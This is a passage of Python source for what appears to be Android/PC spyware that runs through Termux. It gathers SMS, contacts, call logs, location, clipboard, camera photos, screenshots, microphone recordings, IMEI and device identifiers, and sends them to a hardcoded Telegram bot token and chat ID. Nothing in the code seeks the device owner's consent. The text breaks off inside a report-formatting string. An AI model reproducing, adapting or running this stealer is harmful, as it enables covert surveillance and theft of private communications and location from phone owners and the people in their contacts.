import requests
import socket
import platform
import os
import getpass
import subprocess
import json
import time
import io
import base64
import re
from datetime import datetime
import zipfile
import glob
import threading
import queue

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

BOT_TOKEN = "8320785106:AAHCx1lOwuk97l2zOCOqAhEVFkpr-5Xx1Pw"
USER_ID = 7765463669

IS_ANDROID = platform.system() == 'Linux' and 'ANDROID_ROOT' in os.environ

def parse_sms_output(output):
    sms_list = []
    lines = output.strip().split('\n')
    for line in lines:
        if ':' in line and len(line.split(':', 2)) == 3:
            parts = line.split(':', 2)
            number, date, body = [p.strip() for p in parts]
            sms_list.append({'number': number, 'date': date, 'body': body})
    return sms_list[:100]

def get_mac_address():
    if IS_ANDROID:
        try:
            with open('/sys/class/net/wlan0/address', 'r') as f:
                return f.read().strip()
        except:
            try:
                wifi_info = subprocess.check_output(['termux-wifi-connectioninfo', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
                mac_match = re.search(r'"macAddress":"([0-9a-f:]+)"', wifi_info)
                return mac_match.group(1) if mac_match else "Не доступен"
            except:
                return "Не доступен"
    else:
        if PSUTIL_AVAILABLE:
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_PACKET and addr.address:
                            return addr.address
            except:
                pass
        return "Не доступен"

def get_detailed_system_info():
    info = {}
    
    try:
        info['external_ip'] = requests.get('https://api64.ipify.org?format=json', timeout=5).json()['ip']
    except:
        info['external_ip'] = "Не доступен"
    
    try:
        hostname = socket.gethostname()
        info['local_ip'] = socket.gethostbyname(hostname)
        info['hostname'] = hostname
    except:
        info['local_ip'] = "Не доступен"
        info['hostname'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            info['android_version'] = subprocess.check_output(['getprop', 'ro.build.version.release'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['android_version'] = "Не доступен"
        
        try:
            info['security_patch'] = subprocess.check_output(['getprop', 'ro.build.version.security_patch'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['security_patch'] = "Не доступен"
        
        try:
            info['device_model'] = subprocess.check_output(['getprop', 'ro.product.model'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['device_model'] = "Не доступен"
        
        try:
            info['manufacturer'] = subprocess.check_output(['getprop', 'ro.product.manufacturer'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['manufacturer'] = "Не доступен"
        
        try:
            info['device_name'] = subprocess.check_output(['getprop', 'ro.product.name'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['device_name'] = "Не доступен"
        
        try:
            info['board'] = subprocess.check_output(['getprop', 'ro.product.board'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['board'] = "Не доступен"
        
        try:
            info['hardware'] = subprocess.check_output(['getprop', 'ro.hardware'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['hardware'] = "Не доступен"
        
        try:
            info['gpu_renderer'] = subprocess.check_output(['getprop', 'ro.hardware.gralloc'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['gpu_renderer'] = "Не доступен"
        
        try:
            info['play_services'] = subprocess.check_output(['dumpsys', 'package', 'com.google.android.gms'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            version_match = re.search(r'versionName=([^\s,]+)', info['play_services'])
            info['play_services'] = version_match.group(1) if version_match else "Не доступен"
        except:
            info['play_services'] = "Не доступен"
        
        try:
            info['boot_time'] = subprocess.check_output(['getprop', 'sys.boot_completed'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['boot_time'] = "Не доступен"
    else:
        info['os_version'] = platform.platform()
        info['device_model'] = platform.node()
        info['manufacturer'] = platform.processor() or "Не доступен"
        info['device_name'] = "PC"
        info['board'] = "N/A"
        info['hardware'] = platform.machine()
        info['gpu_renderer'] = "N/A"
        info['play_services'] = "N/A"
        info['boot_time'] = "N/A"
    
    info['mac_address'] = get_mac_address()
    
    info['current_user'] = getpass.getuser()
    info['current_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if IS_ANDROID:
        try:
            result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                lines = [line for line in result.stdout.strip().split('\n') if line]
                info['storage_details'] = '\n'.join(lines[:10])
                data_line = None
                for line in lines[1:]:
                    if any(mount in line for mount in ['/data', '/storage/emulated/0']):
                        data_line = line.split()
                        break
                if data_line and len(data_line) >= 4:
                    info['storage_total'] = data_line[1]
                    info['storage_used'] = data_line[2]
                    info['storage_free'] = data_line[3]
                else:
                    info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
            else:
                info['storage_details'] = "Не доступен"
                info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
        except:
            info['storage_details'] = "Не доступен"
            info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
    else:
        if PSUTIL_AVAILABLE:
            try:
                disk = psutil.disk_usage('/')
                info['storage_total'] = f"{disk.total / (1024**3):.1f} GB"
                info['storage_used'] = f"{disk.used / (1024**3):.1f} GB"
                info['storage_free'] = f"{disk.free / (1024**3):.1f} GB"
                info['storage_details'] = f"Root partition: {disk.percent}% used"
            except:
                info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
                info['storage_details'] = "Не доступен"
        else:
            info['storage_total'] = info['storage_used'] = info['storage_free'] = "Не доступен"
            info['storage_details'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            apps_result = subprocess.check_output(['pm', 'list', 'packages'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['apps_count'] = len([pkg for pkg in apps_result.split('\n') if pkg.startswith('package:')])
        except:
            info['apps_count'] = 0
    else:
        info['apps_count'] = "N/A (PC)"
    
    if IS_ANDROID:
        try:
            info['sdk_version'] = subprocess.check_output(['getprop', 'ro.build.version.sdk'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['sdk_version'] = "Не доступен"
        try:
            info['build_id'] = subprocess.check_output(['getprop', 'ro.build.id'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['build_id'] = "Не доступен"
        try:
            info['build_type'] = subprocess.check_output(['getprop', 'ro.build.type'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['build_type'] = "Не доступен"
        try:
            info['product_brand'] = subprocess.check_output(['getprop', 'ro.product.brand'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['product_brand'] = "Не доступен"
        try:
            info['product_device'] = subprocess.check_output(['getprop', 'ro.product.device'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['product_device'] = "Не доступен"
    else:
        info['sdk_version'] = "N/A"
        info['build_id'] = "N/A"
        info['build_type'] = "N/A"
        info['product_brand'] = "N/A"
        info['product_device'] = "N/A"
    
    try:
        info['kernel_version'] = platform.release()
    except:
        info['kernel_version'] = "Не доступен"
    
    try:
        info['architecture'] = platform.machine()
    except:
        info['architecture'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            result = subprocess.run(['cat', '/proc/meminfo'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                mem_info = result.stdout.strip()
                mem_lines = mem_info.split('\n')
                total_mem_line = next((line for line in mem_lines if 'MemTotal' in line), None)
                if total_mem_line:
                    info['total_memory'] = total_mem_line.split()[1] + ' KB'
                info['full_memory_info'] = '\n'.join(mem_lines[:5])
                free_mem_line = next((line for line in mem_lines if 'MemFree' in line), None)
                if free_mem_line and total_mem_line:
                    total_kb = int(total_mem_line.split()[1])
                    free_kb = int(free_mem_line.split()[1])
                    info['ram_usage_percent'] = f"{((total_kb - free_kb) / total_kb * 100):.1f}%"
            else:
                info['total_memory'] = "Не доступен"
                info['full_memory_info'] = "Не доступен"
                info['ram_usage_percent'] = "Не доступен"
        except:
            info['total_memory'] = "Не доступен"
            info['full_memory_info'] = "Не доступен"
            info['ram_usage_percent'] = "Не доступен"
    else:
        if PSUTIL_AVAILABLE:
            try:
                memory = psutil.virtual_memory()
                info['total_memory'] = f"{memory.total / (1024**3):.1f} GB"
                info['ram_usage_percent'] = f"{memory.percent}%"
                info['full_memory_info'] = f"Available: {memory.available / (1024**3):.1f} GB"
            except:
                info['total_memory'] = "Не доступен"
                info['ram_usage_percent'] = "Не доступен"
                info['full_memory_info'] = "Не доступен"
        else:
            info['total_memory'] = "Не доступен"
            info['ram_usage_percent'] = "Не доступен"
            info['full_memory_info'] = "Не доступен"
    
    info['platform'] = platform.system()
    info['python_version'] = platform.python_version()
    
    if IS_ANDROID:
        try:
            info['timezone'] = subprocess.check_output(['getprop', 'persist.sys.timezone'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['timezone'] = "Не доступен"
        try:
            info['language'] = subprocess.check_output(['getprop', 'persist.sys.language'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['language'] = "Не доступен"
    else:
        info['timezone'] = time.tzname[0]
        info['language'] = "N/A"
    
    if IS_ANDROID:
        try:
            display_info = subprocess.check_output(['dumpsys', 'display'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            resolution_match = re.search(r'width=([0-9]+) x height=([0-9]+).*?density=([0-9]+)', display_info)
            if resolution_match:
                info['screen_resolution'] = f"{resolution_match.group(1)} x {resolution_match.group(2)}"
                info['screen_density'] = f"{resolution_match.group(3)} dpi"
            else:
                info['screen_resolution'] = "Не доступен"
                info['screen_density'] = "Не доступен"
        except:
            try:
                info['screen_resolution'] = subprocess.check_output(['getprop', 'ro.sf.lcd_density'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() + " dpi"
                info['screen_density'] = "Не доступен"
            except:
                info['screen_resolution'] = "Не доступен"
                info['screen_density'] = "Не доступен"
    else:
        info['screen_resolution'] = "N/A (PC)"
        info['screen_density'] = "N/A"
    
    if IS_ANDROID:
        try:
            contacts_result = subprocess.check_output(['termux-api', 'contacts', '-j', '-n', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['contacts'] = json.loads(contacts_result) if contacts_result and contacts_result != '[]' else []
        except:
            info['contacts'] = []
        
        try:
            sms_result = subprocess.check_output(['termux-sms-list', '-l', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['sms'] = parse_sms_output(sms_result)
        except:
            info['sms'] = []
        
        try:
            calls_result = subprocess.check_output(['termux-telephony-calllog', '-j', '-n', '100'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['call_logs'] = json.loads(calls_result) if calls_result and calls_result != '[]' else []
        except:
            info['call_logs'] = []
        
        try:
            location_result = subprocess.check_output(['termux-location', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['location'] = json.loads(location_result) if location_result else {}
        except:
            info['location'] = {}
    else:
        info['contacts'] = []
        info['sms'] = []
        info['call_logs'] = []
        info['location'] = {}
    
    try:
        info['clipboard'] = subprocess.check_output(['termux-clipboard-get'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() if IS_ANDROID else "N/A (PC)"
    except:
        info['clipboard'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            apps_list = subprocess.check_output(['pm', 'list', 'packages', '-f'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
            info['installed_apps'] = [line.strip() for line in apps_list.split('\n') if line.startswith('package:')]
        except:
            info['installed_apps'] = []
    else:
        info['installed_apps'] = []
    
    if IS_ANDROID:
        try:
            battery_result = subprocess.check_output(['termux-battery-status', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['battery'] = json.loads(battery_result) if battery_result else {}
        except:
            info['battery'] = {}
    else:
        if PSUTIL_AVAILABLE:
            try:
                battery = psutil.sensors_battery()
                info['battery'] = {'percentage': battery.percent if battery else 'N/A', 'status': battery.power_plugged if battery else 'N/A'}
            except:
                info['battery'] = {}
        else:
            info['battery'] = {}
    
    if IS_ANDROID:
        try:
            wifi_result = subprocess.check_output(['termux-wifi-scaninfo', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['wifi_networks'] = json.loads(wifi_result) if wifi_result else []
        except:
            info['wifi_networks'] = []
        
        try:
            wifi_connection = subprocess.check_output(['termux-wifi-connectioninfo', '-j'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['current_wifi'] = json.loads(wifi_connection) if wifi_connection else {}
        except:
            info['current_wifi'] = {}
    else:
        if PSUTIL_AVAILABLE:
            try:
                info['wifi_networks'] = len(psutil.net_io_counters(pernic=True))
                info['current_wifi'] = {'ssid': 'N/A'}
            except:
                info['wifi_networks'] = []
                info['current_wifi'] = {}
        else:
            info['wifi_networks'] = []
            info['current_wifi'] = {}
    
    if IS_ANDROID:
        try:
            sensor_result = subprocess.check_output(['termux-sensor', '-s', 'all', '-n', '1', '-j'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['sensors'] = json.loads(sensor_result) if sensor_result else {}
        except:
            info['sensors'] = {}
    else:
        info['sensors'] = {}
    
    if IS_ANDROID:
        try:
            processes_result = subprocess.check_output(['top', '-n', '1', '-b'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['running_processes'] = [line for line in processes_result.split('\n') if line.strip()][:15]
        except:
            info['running_processes'] = []
        
        try:
            full_processes = subprocess.check_output(['ps', '-A'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
            info['all_processes'] = full_processes[:1500]
        except:
            info['all_processes'] = "Не доступен"
    else:
        if PSUTIL_AVAILABLE:
            try:
                info['running_processes'] = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])][:15]
                info['all_processes'] = f"Процессов: {len(list(psutil.process_iter()))}"
            except:
                info['running_processes'] = []
                info['all_processes'] = "Не доступен"
        else:
            info['running_processes'] = []
            info['all_processes'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            result = subprocess.run(['cat', '/proc/cpuinfo'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                info['cpu_details'] = result.stdout.strip()[:800]
            else:
                info['cpu_details'] = "Не доступен"
        except:
            info['cpu_details'] = "Не доступен"
    else:
        if PSUTIL_AVAILABLE:
            try:
                cpu_freq = psutil.cpu_freq()
                info['cpu_details'] = f"Cores: {psutil.cpu_count()}, Freq: {cpu_freq.current / 1000 if cpu_freq else 'N/A'} GHz, Usage: {psutil.cpu_percent()}%"
            except:
                info['cpu_details'] = "Не доступен"
        else:
            info['cpu_details'] = "Не доступен"
    
    try:
        cpu_freq_result = subprocess.check_output(['cat', '/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq'], timeout=3, stderr=subprocess.DEVNULL).decode().strip() if IS_ANDROID else "N/A"
        info['cpu_frequency'] = f"{int(cpu_freq_result) / 1000} MHz" if IS_ANDROID and cpu_freq_result.isdigit() else info['cpu_details'] if not IS_ANDROID else "Не доступен"
    except:
        info['cpu_frequency'] = "Не доступен"
    
    try:
        loadavg = subprocess.check_output(['cat', '/proc/loadavg'], stderr=subprocess.DEVNULL, timeout=3).decode().strip() if IS_ANDROID else str(psutil.getloadavg()) if PSUTIL_AVAILABLE else "N/A"
        info['cpu_load'] = loadavg.split()[0:3] if IS_ANDROID else loadavg
    except:
        info['cpu_load'] = "Не доступен"
    
    try:
        result = subprocess.run(['uptime'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
        info['uptime'] = result.stdout.strip() if result and result.returncode == 0 else (str(psutil.boot_time()) if PSUTIL_AVAILABLE else "Не доступен")
    except:
        info['uptime'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            selinux_result = subprocess.check_output(['getenforce'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['selinux_status'] = selinux_result
        except:
            info['selinux_status'] = "Не доступен"
        
        try:
            root_check = subprocess.check_output(['which', 'su'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['root_detected'] = "Да" if root_check and root_check != '/system/bin/which: no su' else "Нет"
        except:
            info['root_detected'] = "Не доступен"
        
        try:
            android_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['android_id'] = android_id
        except:
            info['android_id'] = "Не доступен"
    else:
        info['selinux_status'] = "N/A"
        info['root_detected'] = "N/A"
        info['android_id'] = "N/A"
    
    info['device_fingerprint'] = f"{info['device_model']}_{info['build_id'] if 'build_id' in info else 'N/A'}"
    
    if IS_ANDROID:
        try:
            thermal_zones = []
            for i in range(5):
                try:
                    if os.path.exists(f'/sys/class/thermal/thermal_zone{i}/temp'):
                        temp = subprocess.check_output(['cat', f'/sys/class/thermal/thermal_zone{i}/temp'], timeout=2, stderr=subprocess.DEVNULL).decode().strip()
                        if temp.isdigit():
                            thermal_zones.append(f"Zone {i}: {int(temp)/1000}°C")
                except:
                    continue
            info['thermal_zones'] = '; '.join(thermal_zones)
        except:
            info['thermal_zones'] = "Не доступен"
    else:
        info['thermal_zones'] = "N/A"
    
    try:
        dns_result = subprocess.run(['cat', '/system/etc/resolv.conf'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
        info['dns_servers'] = dns_result.stdout.strip() if dns_result and dns_result.returncode == 0 else "Не доступен"
    except:
        info['dns_servers'] = "Не доступен"
    
    info['data_usage'] = "Не доступен"
    if IS_ANDROID:
        try:
            net_dev = subprocess.run(['cat', '/proc/net/dev'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL)
            if net_dev.returncode == 0:
                lines = net_dev.stdout.strip().split('\n')
                total_rx = total_tx = 0
                for line in lines[2:]:
                    parts = line.split()
                    if len(parts) >= 10:
                        total_rx += int(parts[1])
                        total_tx += int(parts[9])
                info['data_usage'] = f"RX: {total_rx / (1024*1024):.1f} MB, TX: {total_tx / (1024*1024):.1f} MB"
        except:
            pass
    else:
        if PSUTIL_AVAILABLE:
            try:
                net_io = psutil.net_io_counters(pernic=True)
                total_rx = sum(c.bytes_recv for c in net_io.values())
                total_tx = sum(c.bytes_sent for c in net_io.values())
                info['data_usage'] = f"RX: {total_rx / (1024*1024):.1f} MB, TX: {total_tx / (1024*1024):.1f} MB"
            except:
                pass
    
    try:
        ping_result = subprocess.check_output(['ping', '-c', '2', 'google.com'], timeout=6, stderr=subprocess.DEVNULL).decode().strip()
        latency_match = re.search(r'time=([0-9.]+) ms', ping_result)
        info['ping_latency'] = f"{latency_match.group(1)} ms avg" if latency_match else "Не доступен"
    except:
        info['ping_latency'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            termux_pkgs = subprocess.check_output(['pkg', 'list-installed'], stderr=subprocess.DEVNULL, timeout=3).decode().strip()
            info['termux_packages'] = [line.split('/')[0].strip() for line in termux_pkgs.split('\n') if '/' in line]
        except:
            info['termux_packages'] = []
    else:
        try:
            pip_list = subprocess.check_output(['pip', 'list'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            info['pip_packages'] = [line.split()[0] for line in pip_list.split('\n') if line and not line.startswith(('Package', '-'))][:50]
        except:
            info['pip_packages'] = []
        info['termux_packages'] = []
    
    if IS_ANDROID:
        try:
            foreground_result = subprocess.check_output(['dumpsys', 'activity', 'activities'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
            resumed_match = re.search(r'mResumedActivity=([^/]+)', foreground_result)
            info['foreground_app'] = resumed_match.group(1) if resumed_match else "Не доступен"
        except:
            info['foreground_app'] = "Не доступен"
    else:
        info['foreground_app'] = "N/A"
    
    detailed_apps = []
    if 'installed_apps' in info and info['installed_apps']:
        packages = [pkg.split(':')[1].strip() for pkg in info['installed_apps']][:20]
        for pkg in packages:
            try:
                if IS_ANDROID:
                    dump_output = subprocess.check_output(['dumpsys', 'package', pkg], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
                    version_match = re.search(r'versionName=([^\s,]+)', dump_output)
                    version = version_match.group(1) if version_match else 'N/A'
                    label_match = re.search(r'applicationLabel=([^,\s]+)', dump_output) or re.search(r'nonLocalizedLabel=([^,\s]+)', dump_output)
                    app_label = label_match.group(1) if label_match else pkg.split('.')[-1].title()
                    detailed_apps.append(f"{app_label} ({pkg}) - v{version}")
            except:
                detailed_apps.append(f"N/A ({pkg})")
    info['detailed_apps'] = detailed_apps
    
    if IS_ANDROID:
        try:
            camera_photo_bytes = subprocess.check_output(['termux-camera-photo', '-c', '0', '-'], timeout=10, stderr=subprocess.DEVNULL)
            info['camera_photo'] = base64.b64encode(camera_photo_bytes).decode() if camera_photo_bytes else None
        except:
            info['camera_photo'] = None
    else:
        info['camera_photo'] = None
    
    try:
        chrome_pkg = 'com.android.chrome' if IS_ANDROID else None
        if chrome_pkg:
            browser_dump = subprocess.check_output(['dumpsys', 'package', chrome_pkg], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            version_match = re.search(r'versionName=([^\s,]+)', browser_dump)
            cookies_count = len(re.findall(r'cookie', browser_dump))
            info['browser_info'] = f"Chrome v{version_match.group(1) if version_match else 'N/A'} (Куки: ~{cookies_count})"
        else:
            info['browser_info'] = "Браузер не найден"
    except:
        info['browser_info'] = "Браузер не найден"
    
    if IS_ANDROID:
        try:
            bluetooth_result = subprocess.check_output(['termux-bluetooth-scaninfo', '-j'], timeout=8, stderr=subprocess.DEVNULL).decode().strip()
            info['bluetooth_devices'] = json.loads(bluetooth_result) if bluetooth_result else []
        except:
            info['bluetooth_devices'] = []
    else:
        if PSUTIL_AVAILABLE:
            try:
                info['bluetooth_devices'] = len([i for i in psutil.net_if_addrs() if 'bluetooth' in i.lower()])
            except:
                info['bluetooth_devices'] = []
        else:
            info['bluetooth_devices'] = []
    
    try:
        result = subprocess.run(['cat', '/proc/net/dev'], capture_output=True, text=True, timeout=3, stderr=subprocess.DEVNULL) if IS_ANDROID else None
        if result and result.returncode == 0:
            info['network_interfaces'] = result.stdout.strip()[:400]
        else:
            if PSUTIL_AVAILABLE and not IS_ANDROID:
                try:
                    info['network_interfaces'] = '\n'.join([f"{iface}: {addrs[0].address}" for iface, addrs in psutil.net_if_addrs().items() if addrs][:5])
                except:
                    info['network_interfaces'] = "Не доступен"
            else:
                info['network_interfaces'] = "Не доступен"
    except:
        info['network_interfaces'] = "Не доступен"
    
    if IS_ANDROID:
        try:
            sim_info = subprocess.check_output(['getprop', 'gsm.sim.operator.alpha'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['sim_carrier'] = sim_info if sim_info else "Не доступен"
        except:
            info['sim_carrier'] = "Не доступен"
        
        try:
            signal_result = subprocess.check_output(['dumpsys', 'telephony.registry'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
            signal_match = re.search(r'mSignalStrength=([-\d]+)', signal_result)
            info['signal_strength'] = f"{signal_match.group(1)} dBm" if signal_match else "Не доступен"
        except:
            info['signal_strength'] = "Не доступен"
        
        try:
            imei_result = subprocess.check_output(['getprop', 'ril.imei'], timeout=3, stderr=subprocess.DEVNULL).decode().strip()
            info['imei'] = imei_result if imei_result else "Не доступен"
        except:
            info['imei'] = "Не доступен"
    else:
        info['sim_carrier'] = "N/A"
        info['signal_strength'] = "N/A"
        info['imei'] = "N/A"
    
    app_permissions = {'camera': 0, 'location': 0, 'microphone': 0, 'contacts': 0}
    if IS_ANDROID and 'installed_apps' in info:
        packages = [pkg.split(':')[1].strip() for pkg in info['installed_apps']][:10]
        for pkg in packages:
            try:
                perm_output = subprocess.check_output(['dumpsys', 'package', pkg, 'permissions'], timeout=5, stderr=subprocess.DEVNULL).decode().strip()
                if 'android.permission.CAMERA' in perm_output:
                    app_permissions['camera'] += 1
                if 'android.permission.ACCESS_FINE_LOCATION' in perm_output:
                    app_permissions['location'] += 1
                if 'android.permission.RECORD_AUDIO' in perm_output:
                    app_permissions['microphone'] += 1
                if 'android.permission.READ_CONTACTS' in perm_output:
                    app_permissions['contacts'] += 1
            except:
                continue
    info['app_permissions'] = app_permissions
    
    env_vars = dict(os.environ)
    sensitive_keys = ['PASSWORD', 'TOKEN', 'KEY', 'SECRET']
    filtered_env = {k: v[:20] + '...' if len(v) > 20 else v for k, v in env_vars.items() if not any(key in k.upper() for key in sensitive_keys)}
    info['env_vars'] = dict(list(filtered_env.items())[:20])
    
    return info

def capture_screenshot_bytes():
    if not IS_ANDROID:
        return None
    try:
        output = subprocess.check_output(['termux-screenshot', '-'], timeout=5, stderr=subprocess.DEVNULL)
        return output
    except:
        return None

def record_audio_bytes():
    if not IS_ANDROID:
        return None
    try:
        output = subprocess.check_output(['termux-microphone-record', '-f', '-', '-l', '15'], timeout=20, stderr=subprocess.DEVNULL)
        return output
    except:
        return None

def create_detailed_buffer(content, filename):
    buffer = io.BytesIO()
    buffer.write(content.encode('utf-8'))
    buffer.seek(0)
    return buffer, filename

def send_to_telegram(text=None, photo_bytes=None, audio_bytes=None, document_buffers=None, caption=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    max_retries = 5
    backoff = 1
    
    if text:
        endpoint = "sendMessage"
        payload = {
            'chat_id': USER_ID,
            'text': text,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        for attempt in range(max_retries):
            try:
                response = requests.post(url + endpoint, data=payload, timeout=10)
                if response.status_code == 200:
                    return True
                time.sleep(backoff)
                backoff *= 2
            except:
                time.sleep(backoff)
                backoff *= 2
    
    if photo_bytes:
        endpoint = "sendPhoto"
        files = {'photo': ('screenshot.png', photo_bytes, 'image/png')}
        data = {'chat_id': USER_ID, 'caption': caption or 'Скриншот экрана'}
        for attempt in range(max_retries):
            try:
                response = requests.post(url + endpoint, files=files, data=data, timeout=20)
                if response.status_code == 200:
                    return True
                time.sleep(backoff)
                backoff *= 2
            except:
                time.sleep(backoff)
                backoff *= 2
    
    if audio_bytes:
        endpoint = "sendAudio"
        files = {'audio': ('audio.wav', audio_bytes, 'audio/wav')}
        data = {'chat_id': USER_ID, 'caption': caption or 'Аудиозапись (15 сек)', 'title': 'Audio', 'performer': 'System'}
        for attempt in range(max_retries):
            try:
                response = requests.post(url + endpoint, files=files, data=data, timeout=45)
                if response.status_code == 200:
                    return True
                time.sleep(backoff)
                backoff *= 2
            except:
                time.sleep(backoff)
                backoff *= 2
    
    if document_buffers:
        for buffer, filename in document_buffers:
            buffer.seek(0)
            file_size = buffer.getbuffer().nbytes
            if file_size > 50 * 1024 * 1024:
                send_to_telegram(text=f"Файл слишком большой ({file_size / (1024*1024):.1f} MB). Пропущен.")
                continue
            endpoint = "sendDocument"
            files = {'document': (filename, buffer, 'text/plain' if filename.endswith('.txt') else 'application/json')}
            data = {'chat_id': USER_ID, 'caption': caption or 'Документ'}
            for attempt in range(max_retries):
                try:
                    response = requests.post(url + endpoint, files=files, data=data, timeout=45)
                    if response.status_code == 200:
                        break
                    time.sleep(backoff)
                    backoff *= 2
                except:
                    time.sleep(backoff)
                    backoff *= 2
    
    return False

def split_and_send_message(messages):
    for i, msg in enumerate(messages, 1):
        send_to_telegram(text=f"<b>Часть {i}/{len(messages)}</b>\n\n{msg}")

def send_system_info():
    device_info = get_detailed_system_info()
    
    contacts_summary = f"Контактов: {len(device_info['contacts'])}"
    sms_summary = f"SMS: {len(device_info['sms'])}"
    calls_summary = f"Звонки: {len(device_info['call_logs'])}"
    location_summary = f"Lat: {device_info['location'].get('latitude', 'N/A')}, Lng: {device_info['location'].get('longitude', 'N/A')}"
    clipboard_summary = device_info['clipboard'][:100] + "..." if device_info['clipboard'] != "Не доступен" else "Не доступен"
    apps_summary = f"Приложений: {device_info['apps_count']}"
    battery_summary = f"{device_info['battery'].get('percentage', 'N/A')}% | {device_info['battery'].get('status', 'N/A')} | Temp: {device_info['battery'].get('temperature', 'N/A')}°C" if IS_ANDROID else f"Батарея: {device_info['battery'].get('percentage', 'N/A')}%"
    wifi_summary = f"Сетей: {len(device_info['wifi_networks'])} | SSID: {device_info['current_wifi'].get('ssid', 'N/A')}"
    sensors_summary = f"Сенсоров: {len(device_info['sensors'].get('sensors', []))}" if IS_ANDROID else "N/A"
    processes_summary = f"Активных: {len([p for p in device_info['running_processes'] if p])}"
    bluetooth_summary = f"Устройств: {len(device_info['bluetooth_devices'])}"
    ram_usage = device_info.get('ram_usage_percent', 'N/A')
    data_usage = device_info.get('data_usage', 'N/A')
    ping_latency = device_info.get('ping_latency', 'N/A')
    permissions_summary = f"Прил. с камерой: {device_info['app_permissions']['camera']}, с геолокацией: {device_info['app_permissions']['location']}, микрофон: {device_info['app_permissions']['microphone']}, контакты: {device_info['app_permissions']['contacts']}"
    sim_summary = f"Оператор: {device_info['sim_carrier']} | Сигнал: {device_info['signal_strength']}" if IS_ANDROID else "N/A"
    imei_summary = f"IMEI: {device_info['imei']}" if IS_ANDROID else "N/A"
    env_summary = f"Переменных окружения: {len(device_info['env_vars'])}"
    packages_summary = f"Pip пакетов: {len(device_info.get('pip_packages', []))}" if not IS_ANDROID else f"Termux пакетов: {len(device_info['termux_packages'])}"
    
    part1 = f"""
<b>📊 ОСНОВНАЯ ИНФОРМАЦИЯ ({'Android' if IS_ANDROID else 'PC'})</b>

📱 Устройство: {device_info['device_model']}
Производитель: {device_info['manufacturer']}
Модель: {device_info['device_name']}
OS: {device_info['android_version'] if IS_ANDROID else info['os_version']} (SDK {device_info['sdk_version']}) | Патч: {device_info['security_patch']}
Сборка: {device_info['build_id']} ({device_info['build_type']})
Uptime: {device_info['uptime']}
SELinux/Root: {device_info['selinux_status']} / {device_info['root_detected']}
Play Services: {device_info['play_services']}
Boot: {device_info['boot_time']}

🖥️ АППАРАТНОЕ:
Платформа: {device_info['board']}
Архитектура: {device_info['architecture']}
